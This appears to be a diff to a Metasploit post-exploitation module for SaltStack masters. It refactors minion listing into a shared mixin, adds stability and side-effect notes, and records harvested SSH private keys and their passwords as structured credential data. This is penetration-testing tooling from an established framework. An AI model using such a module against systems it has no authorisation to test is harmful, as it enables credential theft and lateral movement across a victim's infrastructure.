@@ -7,6 +7,7 @@ require 'yaml'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::File
+  include Msf::Exploit::Local::Saltstack
 
   def initialize(info = {})
     super(
@@ -28,7 +29,12 @@ class MetasploitModule < Msf::Post
           'c2Vlcgo'
         ],
         'SessionTypes' => %w[shell meterpreter],
-        'License' => MSF_LICENSE
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
     register_options(
@@ -89,7 +95,7 @@ class MetasploitModule < Msf::Post
     return if results == false || results.nil?
     return if results.include?('Salt request timed out.') || results.include?('Minion did not return.')
 
-    results.each do |_key, result|
+    results.each_value do |result|
       # at times the first line may be "Minions returned with non-zero exit code", so we want to skip that
       next if result.is_a? String
 
@@ -133,21 +139,9 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  def list_minions
-    # pull minions from a master
-    print_status('Attempting to list minions')
-    unless command_exists?('salt-key')
-      print_error('salt-key not present on system')
-      return
-    end
-    begin
-      out = cmd_exec('salt-key', '-L --output=yaml', datastore['TIMEOUT'])
-      vprint_status(out)
-      minions = YAML.safe_load(out)
-    rescue Psych::SyntaxError
-      print_error('Unable to load salt-key -L data')
-      return
-    end
+  def list_minions_printer
+    minions = list_minions
+    return if minions.nil?
 
     tbl = Rex::Text::Table.new(
       'Header' => 'Minions List',
@@ -155,9 +149,7 @@ class MetasploitModule < Msf::Post
       'Columns' => ['Status', 'Minion Name']
     )
 
-    store_path = store_loot('saltstack_minions', 'application/x-yaml', session, minions.to_yaml, 'minions.yaml', 'SaltStack Salt salt-key list')
-    print_good("#{peer} - minion file successfully retrieved and saved to #{store_path}")
-    minions['minions'].each do |minion|
+    minions.each do |minion|
       tbl << ['Accepted', minion]
     end
     minions['minions_pre'].each do |minion|
@@ -193,7 +185,7 @@ class MetasploitModule < Msf::Post
   end
 
   def master
-    list_minions
+    list_minions_printer
     gather_minion_data if datastore['GETOS'] || datastore['GETHOSTNAME'] || datastore['GETIP']
 
     # get sls files
@@ -240,7 +232,10 @@ class MetasploitModule < Msf::Post
                       proto: 'TCP',
                       port: port,
                       type: 'SSH Key Password',
-                      data: "#{priv} => #{priv_pass}")
+                      data: {
+                        ssh_key: priv,
+                        password: priv_pass
+                      })
         end
 
         host_info = {
